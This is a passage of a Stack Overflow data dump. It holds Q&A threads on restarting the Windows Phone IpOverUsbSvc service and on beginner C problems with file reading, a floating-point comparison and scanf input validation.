"comment_id": 54117291, "body": "given: ` Phone IP over USB Transport (IpOverUsbSvc) is not running. ` is saying some <code>service</code> is not running.  so the <code>service</code> needs to be started.  I do not (if I can avoid it) use windows, so do not remember the exact details of how to start a service.  however, this should help you: &lt;<a href=\"https://msdn.microsoft.com/en-us/library/htkdfk18%28v=vs.110%29.aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/htkdfk18%28v=vs.110%29.asp&zwnj;&#8203;x</a>&gt;"}, {"owner": {"reputation": 97, "user_id": 3173605, "user_type": "registered", "accept_rate": 57, "profile_image": "https://graph.facebook.com/100001500933632/picture?type=large", "display_name": "Maxim", "link": "https://stackoverflow.com/users/3173605/maxim"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444933200, "post_id": 33129684, "comment_id": 54120375, "body": "Page is missing &#39;link incorrect&#39;."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444963993, "post_id": 33129684, "comment_id": 54132278, "body": "That is odd.  I got to the linked page by googling for &#39;how to start a service in windows&#39; and opened the &#39;hit&#39; with the title <code>How to: Start Services - MSDN - Microsoft</code>"}], "answers": [{"tags": [], "owner": {"reputation": 127, "user_id": 2859460, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/VMLyI.jpg?s=128&g=1", "display_name": "hal9k2", "link": "https://stackoverflow.com/users/2859460/hal9k2"}, "is_accepted": true, "score": 2, "last_activity_date": 1447406800, "last_edit_date": 1447406800, "creation_date": 1447406442, "answer_id": 33689379, "question_id": 33129684, "link": "https://stackoverflow.com/questions/33129684/error-dep6100-the-following-unexpected-error-occurred-during-bootstrapping-s/33689379#33689379", "title": "Error : DEP6100 : The following unexpected error occurred during bootstrapping stage &#39;Connecting to the device &#39;", "body": "<p>I recently had that problem and found that this can have several fixes.</p>\n\n<p>First try check if you have that service installed, open PowerShell window and type: </p>\n\n<pre><code>Get-Service -Name *USB*\nStatus   Name               DisplayName\nStopped  IpOverUsbSvc       Windows Phone IP over USB Transport...\n</code></pre>\n\n<p>If you get answer that service is installed but stopped restart it.</p>\n\n<pre><code>Start-Service IpOverUsbSvc\n</code></pre>\n\n<p>If no answer try to install windows phone 8 SDK, restart computer try to check again if service is installed then if it is you can continue with debug.</p>\n\n<p>If no try to input this registry values to your system registry.\nCopy paste this below and save as a 'reg' file. Then double click and add, restart computer, check if you have service.</p>\n\n<pre><code>Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\IpOverUsbSvc]\n\"DisplayName\"=\"Windows Phone IP over USB Transport (IpOverUsbSvc)\"\n\"Description\"=\"Enables communication between Windows Phone SDK and Windows Phone device. If the service is stopped, application deployment and debugging will fail on device.\"\n\"Type\"=dword:00000010\n\"Start\"=dword:00000002\n\"ErrorControl\"=dword:00000000\n\"ImagePath\"=hex(2):22,00,43,00,3a,00,5c,00,50,00,72,00,6f,00,67,00,72,00,61,00,\\\n  6d,00,20,00,46,00,69,00,6c,00,65,00,73,00,20,00,28,00,78,00,38,00,36,00,29,\\\n  00,5c,00,43,00,6f,00,6d,00,6d,00,6f,00,6e,00,20,00,46,00,69,00,6c,00,65,00,\\\n  73,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,73,00,6f,00,66,00,74,00,20,00,53,\\\n  00,68,00,61,00,72,00,65,00,64,00,5c,00,50,00,68,00,6f,00,6e,00,65,00,20,00,\\\n  54,00,6f,00,6f,00,6c,00,73,00,5c,00,43,00,6f,00,72,00,65,00,43,00,6f,00,6e,\\\n  00,5c,00,31,00,31,00,2e,00,30,00,5c,00,62,00,69,00,6e,00,5c,00,49,00,70,00,\\\n  4f,00,76,00,65,00,72,00,55,00,73,00,62,00,53,00,76,00,63,00,2e,00,65,00,78,\\\n  00,65,00,22,00,00,00\n\"ObjectName\"=\"LocalSystem\"\n</code></pre>\n\n<p>If this also didn't help yuu check if you have executable under directory:</p>\n\n<pre><code>C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\Phone Tools\\CoreCon\\11.0\\bin\\IpOverUsbSvc.exe\n</code></pre>\n\n<p>Try to install service from normal command prompt using installutil program like this.</p>\n\n<pre><code>installutil IpOverUsbSvc.exe\n</code></pre>\n\n<p>Hope that helps.</p>\n"}], "owner": {"reputation": 97, "user_id": 3173605, "user_type": "registered", "accept_rate": 57, "profile_image": "https://graph.facebook.com/100001500933632/picture?type=large", "display_name": "Maxim", "link": "https://stackoverflow.com/users/3173605/maxim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2184, "favorite_count": 1, "accepted_answer_id": 33689379, "answer_count": 1, "score": 5, "last_activity_date": 1448542784, "creation_date": 1444836956, "last_edit_date": 1444841154, "question_id": 33129684, "link": "https://stackoverflow.com/questions/33129684/error-dep6100-the-following-unexpected-error-occurred-during-bootstrapping-s", "title": "Error : DEP6100 : The following unexpected error occurred during bootstrapping stage &#39;Connecting to the device &#39;", "body": "<blockquote>\n  <p>Error : DEP6100 : The following unexpected error occurred during bootstrapping stage 'Connecting to the device '30F105C9-681E-420b-A277-7C086EAD8A4E'.': \n  DeviceException - Windows Phone IP over USB Transport (IpOverUsbSvc) is not running. Retry after starting Windows Phone IP over USB Transport (IpOverUsbSvc) from the services management console.  ParkeerplaatsenApp  </p>\n  \n  <p>Severity   Code    Description Project File    Line\n  Error       Error : DEP6200 : Bootstrapping 'Device' failed. Device cannot be found. Windows Phone IP over USB Transport (IpOverUsbSvc) is not running. Retry after starting Windows Phone IP over USB Transport (IpOverUsbSvc) from the services management console.   ParkeerplaatsenApp      </p>\n</blockquote>\n\n<p>These are the errors I get when trying to run my Project on my Windows 10 pc.\nIt's a application about parking spots if this should matter.   </p>\n"}, {"tags": ["c", "file", "io"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1444837127, "post_id": 33129639, "comment_id": 54071270, "body": "check the return value of <code>fopen()</code> first."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444838649, "post_id": 33129639, "comment_id": 54072305, "body": "this line: <code>char line[25];</code> is not large enough for a 25 char line to be input.  it needs more room for the newline and more room for the trailing NUL byte."}], "answers": [{"comments": [{"owner": {"reputation": 1476, "user_id": 4301564, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/3983c5773e51a5f05aa92a1dac77a711?s=128&d=identicon&r=PG&f=1", "display_name": "fangio", "link": "https://stackoverflow.com/users/4301564/fangio"}, "edited": false, "score": 0, "creation_date": 1444837077, "post_id": 33129688, "comment_id": 54071231, "body": "And when do you use %s?"}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1444837192, "post_id": 33129688, "comment_id": 54071317, "body": "<code>%s</code> is useful to print <b>a sttring</b>. example: <code>printf(&quot;%s&quot;, line);</code>"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 1476, "user_id": 4301564, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/3983c5773e51a5f05aa92a1dac77a711?s=128&d=identicon&r=PG&f=1", "display_name": "fangio", "link": "https://stackoverflow.com/users/4301564/fangio"}, "edited": false, "score": 0, "creation_date": 1444837197, "post_id": 33129688, "comment_id": 54071325, "body": "@fangio  When you want to print <b>C-style string</b>  .  C-style string is <i>null terminated character array</i> ."}, {"owner": {"reputation": 1476, "user_id": 4301564, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/3983c5773e51a5f05aa92a1dac77a711?s=128&d=identicon&r=PG&f=1", "display_name": "fangio", "link": "https://stackoverflow.com/users/4301564/fangio"}, "edited": false, "score": 0, "creation_date": 1444837453, "post_id": 33129688, "comment_id": 54071504, "body": "Is it normal that printing the full line at once gives another result than printing one by one?"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 1476, "user_id": 4301564, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/3983c5773e51a5f05aa92a1dac77a711?s=128&d=identicon&r=PG&f=1", "display_name": "fangio", "link": "https://stackoverflow.com/users/4301564/fangio"}, "edited": false, "score": 0, "creation_date": 1444837547, "post_id": 33129688, "comment_id": 54071554, "body": "@fangio  Just for output no (Maybe each character in different line if you use <code>&#39;\\n&#39;</code> ), other than  that printing character by character  requires an extra loop ."}], "tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": false, "score": 1, "last_activity_date": 1444837289, "last_edit_date": 1444837289, "creation_date": 1444836974, "answer_id": 33129688, "question_id": 33129639, "link": "https://stackoverflow.com/questions/33129639/reading-file-line-by-line-character-by-character-in-c/33129688#33129688", "title": "Reading file, line by line, character by character in C", "body": "<pre><code> printf(\"%s\",line[i]);     // %s expects char * and line[i] is  a char \n</code></pre>\n\n<p>This should be -</p>\n\n<pre><code> printf(\"%c\",line[i]);     // to print character by charcter \n</code></pre>\n\n<p>To store <code>25</code> characters declare <code>line</code> as -</p>\n\n<pre><code>char line[25+1];  // +1 for null character\n</code></pre>\n\n<p><em>Note</em> - As you ask in comment to <code>%s</code> can be used as -</p>\n\n<pre><code>printf(\"%s\",line);         // no loop required\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "is_accepted": true, "score": 2, "last_activity_date": 1444837042, "creation_date": 1444837042, "answer_id": 33129718, "question_id": 33129639, "link": "https://stackoverflow.com/questions/33129639/reading-file-line-by-line-character-by-character-in-c/33129718#33129718", "title": "Reading file, line by line, character by character in C", "body": "<ul>\n<li>An array of 25 elements isn't enough to store lines of 25 characters: +1 for newline and +1 for terminating null character.</li>\n<li>You should check if the opening of the file is successful</li>\n<li><code>%c</code> have to be used to print one character via <code>printf</code>.</li>\n</ul>\n\n<p>fixed code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint read_file(const char* filename){\n\n    FILE* file = fopen(filename, \"r\");\n    char line[27]; /* an array of 25 elements isn't enough to store lines of 25 characters: +1 for newline and +1 for terminating null character */\n    int i;\n    int counter = 0;\n\n    if (file == NULL) return 1; /* check if the file is successfully opened */\n\n    while (fgets(line, sizeof(line), file))\n    {\n        if (counter == 0)\n        {\n            counter++;\n        }\n        else\n        {\n\n            for(i = 0; i &lt; 25 ; i++){\n                 printf(\"%c\",line[i]); /* use %c instead of %s to print one character */\n            }\n        }\n    }\n\n    fclose(file);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 1476, "user_id": 4301564, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/3983c5773e51a5f05aa92a1dac77a711?s=128&d=identicon&r=PG&f=1", "display_name": "fangio", "link": "https://stackoverflow.com/users/4301564/fangio"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6032, "favorite_count": 0, "accepted_answer_id": 33129718, "answer_count": 2, "score": 0, "last_activity_date": 1444837289, "creation_date": 1444836849, "question_id": 33129639, "link": "https://stackoverflow.com/questions/33129639/reading-file-line-by-line-character-by-character-in-c", "title": "Reading file, line by line, character by character in C", "body": "<p>I have a problem with reading a file in C.<br>\nI want to read a file line by line.<br>\nEach line contains 25 characters and each character has a special value that I    have to use in other functions. My code:</p>\n\n<pre><code>int read_file(const char* filename){\n\n    FILE* file = fopen(filename, \"r\");\n    char line[25];\n    int i;\n    int counter = 0;\n\n\n\n    while (fgets(line, sizeof(line), file))\n    {\n        if (counter == 0)\n        {\n            counter++;\n        }\n        else\n        {\n\n                for(i = 0; i &lt; 25 ; i++){\n                     printf(\"%s\",line[i]);\n                }\n        }\n    }\n\n    fclose(file);\n\n    return 0;\n}\n</code></pre>\n\n<p>I have to do something else then print it, but when I try this code, it gives errors, so doing something else would do the same I guess.\nSo my code needs to read the file line by line and then I need to be able to read it character by character.</p>\n"}, {"tags": ["c", "inequality"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1444836715, "post_id": 33129541, "comment_id": 54070966, "body": "Can&#39;t reproduce. Try <code>1e16LL</code>. Update: Actually the exponent notation is returning float type, so you can&#39;t append integer suffix to it. You better use integer constants"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1444837332, "post_id": 33129541, "comment_id": 54071411, "body": "@EugeneSh. <code>float</code> or <code>double</code>?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1444837375, "post_id": 33129541, "comment_id": 54071438, "body": "@SouravGhosh Floating point. The exact type doesn&#39;t really matter here, I believe.."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444838543, "post_id": 33129541, "comment_id": 54072236, "body": "I&#39;m voting to close this question as off-topic because FP, compares and I can&#39;t be bothered to look up the dups."}, {"owner": {"reputation": 21, "user_id": 5445760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d9686336a3656d50a80ea3219d74f32?s=128&d=identicon&r=PG&f=1", "display_name": "strawman", "link": "https://stackoverflow.com/users/5445760/strawman"}, "edited": false, "score": 0, "creation_date": 1444840164, "post_id": 33129541, "comment_id": 54073239, "body": "Thanks for help all! Think I understand what&#39;s happening here now."}], "answers": [{"tags": [], "owner": {"reputation": 423, "user_id": 818065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eFylX.jpg?s=128&g=1", "display_name": "Breezer", "link": "https://stackoverflow.com/users/818065/breezer"}, "is_accepted": true, "score": 3, "last_activity_date": 1444837298, "creation_date": 1444837298, "answer_id": 33129810, "question_id": 33129541, "link": "https://stackoverflow.com/questions/33129541/inequalities-in-c-not-working/33129810#33129810", "title": "Inequalities in c not working", "body": "<p>1e16 is a double type literal value, and floats/doubles can be imprecise for decimal arithmetic/comparison (just one of many common examples: decimal 0.2). Its going to cast the long-long z upwards to double for the comparison, and I'm guessing the standard double representation can't store the precision needed (maybe someone else can demonstrate the binary mantissa/sign representations)</p>\n\n<p>Try changing the 1e16 to (long double)1e16, it doesn't then print out your message. (update: or, as the other question-commenter added, change 1e16 to an integer literal)</p>\n"}, {"tags": [], "owner": {"reputation": 6336, "user_id": 4023446, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Orest Hera", "link": "https://stackoverflow.com/users/4023446/orest-hera"}, "is_accepted": false, "score": 1, "last_activity_date": 1444839666, "last_edit_date": 1495540741, "creation_date": 1444838610, "answer_id": 33130246, "question_id": 33129541, "link": "https://stackoverflow.com/questions/33129541/inequalities-in-c-not-working/33130246#33130246", "title": "Inequalities in c not working", "body": "<p>The doubles and floats can hold limited number of digits. In your case the double numbers with values <code>9999999999999999</code> and <code>1e16</code> have identical 8 bytes of hex representation. You can check them byte by byte:</p>\n\n<pre><code>long long z = 9999999999999999;\ndouble dz1 = z;\ndouble dz2 = 1e16;\n\n/* prints 0 */\nprintf(\"memcmp: %d\\n\", memcmp(&amp;dz1, &amp;dz2, sizeof(double)));\n</code></pre>\n\n<p>So, they are equal.</p>\n\n<p>Smaller integers can be stored in double with perfect precision. For example, see <a href=\"https://en.wikipedia.org/wiki/Double-precision_floating-point_format\" rel=\"nofollow noreferrer\">Double-precision floating-point format</a> or <a href=\"https://stackoverflow.com/questions/1848700/biggest-integer-that-can-be-stored-in-a-double\">biggest integer that can be stored in a double</a></p>\n\n<p>The maximum integer that can be converted to double exactly is 2<sup>53</sup> (<code>9007199254740992</code>).</p>\n"}], "owner": {"reputation": 21, "user_id": 5445760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d9686336a3656d50a80ea3219d74f32?s=128&d=identicon&r=PG&f=1", "display_name": "strawman", "link": "https://stackoverflow.com/users/5445760/strawman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 238, "favorite_count": 0, "accepted_answer_id": 33129810, "answer_count": 2, "score": 1, "last_activity_date": 1444839666, "creation_date": 1444836586, "question_id": 33129541, "link": "https://stackoverflow.com/questions/33129541/inequalities-in-c-not-working", "title": "Inequalities in c not working", "body": "<p>I'm learning c, and am confused as my code seems to evaluate ( 1e16 - 1 >= 1e16 ) as true when it should be false. My code is below, it returns </p>\n\n<pre><code>9999999999999999 INVALIDBIG\\n\n</code></pre>\n\n<p>when I would expect it not to return anything. I thought any problems with large numbers could be avoided by using long long.</p>\n\n<pre><code>int main(void)\n{\n    long long z;\n\n    z = 9999999999999999;\n\n    if ( z &gt;= 1e16 || z &lt; 0 )\n    {\n        printf(\"%lli INVALIDBIG\\n\",z);\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 18827, "user_id": 1413133, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hqUmk.jpg?s=128&g=1", "display_name": "Manos Nikolaidis", "link": "https://stackoverflow.com/users/1413133/manos-nikolaidis"}, "edited": false, "score": 0, "creation_date": 1444836680, "post_id": 33129496, "comment_id": 54070937, "body": "this <code>scanf(&quot;%d&quot;,&amp;temp)</code> is meant to get integer numbers that you are typing. Do you want to type either numbers or chars ?"}, {"owner": {"reputation": 135, "user_id": 5200975, "user_type": "registered", "accept_rate": 77, "profile_image": "https://graph.facebook.com/950102218381326/picture?type=large", "display_name": "KennyYang", "link": "https://stackoverflow.com/users/5200975/kennyyang"}, "reply_to_user": {"reputation": 18827, "user_id": 1413133, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hqUmk.jpg?s=128&g=1", "display_name": "Manos Nikolaidis", "link": "https://stackoverflow.com/users/1413133/manos-nikolaidis"}, "edited": false, "score": 0, "creation_date": 1444838474, "post_id": 33129496, "comment_id": 54072190, "body": "I try to filter out the non-integer."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1444839335, "post_id": 33129496, "comment_id": 54072745, "body": "the loop beginning with: <code>for(i=0;i&lt;8;i++)</code>  could set up to 8 values into <code>int clear_index[2];</code>, but clean_index can only contain 2 values.   I.E. writing beyond the end of the array which invokes undefined behaviour.  This can lead to a seg fault event."}], "answers": [{"comments": [{"owner": {"reputation": 135, "user_id": 5200975, "user_type": "registered", "accept_rate": 77, "profile_image": "https://graph.facebook.com/950102218381326/picture?type=large", "display_name": "KennyYang", "link": "https://stackoverflow.com/users/5200975/kennyyang"}, "edited": false, "score": 0, "creation_date": 1444838603, "post_id": 33129666, "comment_id": 54072274, "body": "I am not sure where can I add this while loop? Should I add it before the if (scanf(&quot;%d&quot;,&amp;temp)==1) ??"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 135, "user_id": 5200975, "user_type": "registered", "accept_rate": 77, "profile_image": "https://graph.facebook.com/950102218381326/picture?type=large", "display_name": "KennyYang", "link": "https://stackoverflow.com/users/5200975/kennyyang"}, "edited": false, "score": 0, "creation_date": 1444838633, "post_id": 33129666, "comment_id": 54072293, "body": "@KennyYang nope. in the else part of the scanf related if statement."}, {"owner": {"reputation": 135, "user_id": 5200975, "user_type": "registered", "accept_rate": 77, "profile_image": "https://graph.facebook.com/950102218381326/picture?type=large", "display_name": "KennyYang", "link": "https://stackoverflow.com/users/5200975/kennyyang"}, "edited": false, "score": 0, "creation_date": 1444839414, "post_id": 33129666, "comment_id": 54072784, "body": "I am not sure how to eat up those invalid input, I just want to do nothing when the input is invalid.I try like this:         else          {             char c;             while((c=getchar())!=&#39;\\n&#39;)                 c = &#39;\\n&#39;;         }  Is it correct to eat up invalid input by assigning the input as &#39;\\n&#39;??"}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 1, "last_activity_date": 1444836932, "creation_date": 1444836932, "answer_id": 33129666, "question_id": 33129496, "link": "https://stackoverflow.com/questions/33129496/scanf-confusion-with-type-error/33129666#33129666", "title": "scanf confusion with type error", "body": "<p>You get the segmentation fault, because, in case, you did not enter an integer, scanf will not return 1, and then, using <code>g[i]</code> will invoke <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\">undefined behavior</a>.</p>\n\n<p>FWIW, <code>g</code> is a local automatic array variable, and unless initialized explicitly, will have indeterminate value. Attempt to read the value will invoke the UB.</p>\n\n<p>Solution:</p>\n\n<ol>\n<li>Always initialize the local variables.</li>\n<li>In case <code>scanf()</code> fails, you need to <em>eat up</em> the <em>invalid</em> input using some loop like <code>while (getchar != '\\n');</code> before you proceed to take the next input.</li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 46, "user_id": 4333492, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002246240709/picture?type=large", "display_name": "Filipe Herculano Rocha", "link": "https://stackoverflow.com/users/4333492/filipe-herculano-rocha"}, "is_accepted": false, "score": 0, "last_activity_date": 1444840441, "creation_date": 1444840441, "answer_id": 33130887, "question_id": 33129496, "link": "https://stackoverflow.com/questions/33129496/scanf-confusion-with-type-error/33130887#33130887", "title": "scanf confusion with type error", "body": "<p>You are reading a number but the user can place a digit. To prevent this you can use the function <a href=\"http://www.tutorialspoint.com/c_standard_library/c_function_atoi.htm\" rel=\"nofollow\">atoi()</a> from the library stdlib.h. It converts a string to a integer, if the integer is just number digits, it'll convert it to a integer. If it is a character it will return 0. So you just need to prevent the occurrence of a 0 after the atoi() function is called.</p>\n"}], "owner": {"reputation": 135, "user_id": 5200975, "user_type": "registered", "accept_rate": 77, "profile_image": "https://graph.facebook.com/950102218381326/picture?type=large", "display_name": "KennyYang", "link": "https://stackoverflow.com/users/5200975/kennyyang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 253, "favorite_count": 0, "accepted_answer_id": 33129666, "answer_count": 2, "score": 1, "last_activity_date": 1444840441, "creation_date": 1444836471, "question_id": 33129496, "link": "https://stackoverflow.com/questions/33129496/scanf-confusion-with-type-error", "title": "scanf confusion with type error", "body": "<p>I just make a program to guess some random pairs in an array,if guess right, delete this pair.</p>\n\n<p>I met a problem that I can only type integer number.Everytime I tried to type like * ,the program will crash. I use a condition like:</p>\n\n<pre><code>if (scanf(\"%d\",&amp;temp)==1)\n</code></pre>\n\n<p>to try to fix my problem, but it really does'nt work.</p>\n\n<p>here is my code and please give me some help:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nint main() \n{\n    int r[4]; //random\n    int s[8]; //store\n    char c[8]; //cover\n    int g[8]; //guess\n    int i;\n    int round=0;\n    int left = 4;\n    int point = 0;\n    int clear_index[2];\n    int temp;\n\n// generate random number\nfor (i=0;i&lt;4;i++)\n{\n    r[i] = (rand()%10)+1;\n    s[i] = r[i];\n    s[i+4] = r[i];\n}\n// show the default number\nprintf(\"[show]    \");\nfor (i=0;i&lt;8;i++)\n{\n    printf(\"%d \",s[i]);\n    c[i] = '*';\n}\nprintf(\"\\n\");\n\nwhile(left&gt;0)\n{\n    // print left\n    printf(\"[cover]   \");\n    for (i=0;i&lt;8;i++)\n        printf(\"%c \",c[i]);\n    printf(\"\\n\");\n    //guess \n    printf(\"[guess]   \");\n    for(i=0;i&lt;8;i++)\n    {\n        if (scanf(\"%d\",&amp;temp)==1)\n            g[i] = temp;        \n\n        if (g[i] == s[i])\n        {\n            printf(\"v\\n\");\n            clear_index[point] = i;\n            point++;\n        }\n    }\n    if (point == 2)\n    {\n        for (i=0;i&lt;2;i++)\n            c[clear_index[i]]=' ';\n        left-=1;\n        point = 0;          \n    }\n    round+=1;\n    //left-=1;\n}\nprintf(\"you won in %d round\",round);    \n</code></pre>\n\n<p>}</p>\n"}, {"tags": ["c", "integral", "simpsons-rule"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1444836737, "post_id": 33129385, "comment_id": 54070983, "body": "Welcome to the world of approximations and floating point arithmetic.  If you use an approximate formula, you get an approximate result.  It is probably a fluke that the trapezium rule ends up with &#39;exactly&#39; the right answer."}, {"owner": {"reputation": 63, "user_id": 3908631, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d7a01cbfb01fa1ada1ee7dbd12c5bfc?s=128&d=identicon&r=PG&f=1", "display_name": "user3908631", "link": "https://stackoverflow.com/users/3908631/user3908631"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1444836991, "post_id": 33129385, "comment_id": 54071157, "body": "Yeah thats the part that was confusing me was that I figured Simpson&#39;s approximations would have less error than the trapezoidal. But I guess it could just be a fluke with the function I am using. Thank you"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1444841020, "post_id": 33129385, "comment_id": 54073700, "body": "With 99999 iterations I get your required value of <code>1.440422</code>. Some functions converge faster than others, for example there are several ways to calculate <code>pi</code> but not all are useful."}], "answers": [{"comments": [{"owner": {"reputation": 63, "user_id": 3908631, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d7a01cbfb01fa1ada1ee7dbd12c5bfc?s=128&d=identicon&r=PG&f=1", "display_name": "user3908631", "link": "https://stackoverflow.com/users/3908631/user3908631"}, "edited": false, "score": 0, "creation_date": 